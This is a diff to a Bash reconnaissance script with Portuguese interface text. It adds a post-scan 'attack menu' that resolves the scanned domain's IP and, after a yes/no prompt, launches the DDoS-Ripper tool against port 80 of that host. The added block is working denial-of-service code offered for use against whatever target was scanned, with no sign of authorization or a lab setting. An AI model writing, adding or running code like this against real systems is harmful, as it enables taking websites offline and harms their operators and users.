@@ -2203,6 +2203,43 @@ echo -e "${GREEN}${BOLD}║${RESET}  ${BOLD}HTML:${RESET}          ${CYAN}${REPO
 echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
 echo ""
 
+# ===== ATAQUE POS-SCAN =====
+echo ""
+echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
+echo -e "${RED}${BOLD}║         MENU DE ATAQUE - Pos Scan              ║${RESET}"
+echo -e "${RED}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
+echo -e "${RED}${BOLD}║${RESET}"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[1] DDoS${RESET} - DDoS-Ripper (Negacao de Servico)"
+echo -e "${RED}${BOLD}║${RESET}  ${BOLD}[2] Sair${RESET}  - Finalizar"
+echo -e "${RED}${BOLD}║${RESET}"
+echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
+printf "${YELLOW}Deseja iniciar um ataque? (1-2): ${RESET}"; read -r ATAQUE_OPT
+if [ "$ATAQUE_OPT" = "1" ]; then
+  DDOS_IP=$(dig +short "$DOMINIO" 2>/dev/null | head -1)
+  [ -z "$DDOS_IP" ] && DDOS_IP=$(echo "$IP_ALVO" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
+  if [ -n "$DDOS_IP" ]; then
+    echo ""
+    echo -e "${RED}╔══════════════════════════════════════════════════╗${RESET}"
+    echo -e "${RED}║           DDoS - Negacao de Servico             ║${RESET}"
+    echo -e "${RED}╠══════════════════════════════════════════════════╣${RESET}"
+    echo -e "${RED}║${RESET}"
+    echo -e "${RED}║${RESET}  ${YELLOW}Alvo: $DDOS_IP${RESET}"
+    echo -e "${RED}║${RESET}  ${YELLOW}Dominio: $DOMINIO${RESET}"
+    echo -e "${RED}║${RESET}  ${YELLOW}Porta:   ${CYAN}80 (HTTP)${RESET}"
+    echo -e "${RED}║${RESET}"
+    printf "${RED}Iniciar DDoS contra $DDOS_IP:80? (s/N): ${RESET}"; read -r CONFIRMA
+    if [ "$CONFIRMA" = "s" ] || [ "$CONFIRMA" = "S" ]; then
+      echo -e "\n${RED}[!] Iniciando DDoS... Pressione CTRL+C para parar${RESET}\n"
+      cd "$HOME/DDoS-Ripper" 2>/dev/null && python3 DRipper.py -s "$DDOS_IP" -p 80 -t 135
+    else
+      echo -e "\n${GREEN}[+] Ataque cancelado${RESET}"
+    fi
+  else
+    echo -e "\n${RED}[!] Nao foi possivel determinar o IP do alvo${RESET}"
+  fi
+fi
+echo ""
+
 # Trunca relatorio se exceder limite (seguranca contra estouro de disco)
 [ -f "$REPORT" ] && [ "$(stat -c%s "$REPORT" 2>/dev/null || echo 0)" -gt "$MAX_OUTPUT_BYTES" ] && {
   head -c "$MAX_OUTPUT_BYTES" "$REPORT" > "${REPORT}.trim" 2>/dev/null && mv "${REPORT}.trim" "$REPORT" 2>/dev/null
